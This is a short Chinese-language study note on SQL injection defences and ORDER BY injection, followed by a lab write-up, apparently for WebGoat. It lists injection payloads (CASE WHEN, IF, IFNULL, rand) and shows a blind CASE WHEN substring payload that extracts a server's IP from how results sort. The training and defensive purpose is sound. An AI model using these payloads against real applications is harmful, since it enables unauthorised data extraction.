# SQL 注入

这一课程主要介绍了常见的防止 SQL 注入的手段。包括参数过滤、静态查询、存储过程等。

指出即便我的 SQL 不再能够注入，是否还需要对参数进行检查？需要！

* SQL 的 Order By 子句

Order 子句后面还可以接一个查询子句。因此对于网站中需要排序的时候，一定要使用确定的白名单限制列的名字。

常见的注入有：

* (CASE+WHEN+(1=1)+THEN+name+ELSE+price+END)
* IF(1=1,name,price)
* IFNULL(NULL,price)
* rand(1=1)

利用这些判断条件，和排序的结果，能够泄露信息。

## Task 1

1. 首先观察到点击排序后的请求是 ?column=ip 等，猜测，参数被传入 order by 子句。
2. 构造 column=hostname 等，发现均返回正确结果，印证猜测。
3. 设置 column=aaa 报错。返回：

```
unexpected token: THEN in statement [select id, hostname, ip, mac, status, description from servers  where status <> "out of order" order by (1=1) THEN test else id end)]
```
猜测其 webgoat-prd 的 status 是 “out of order”，此时利用构造语句：

``` sql
(case when (substring((select ip from servers where hostname='webgoat-prd'),1,1)=1) then hostname else id)
```
来注入，通过其排序结果来判断各位是啥。
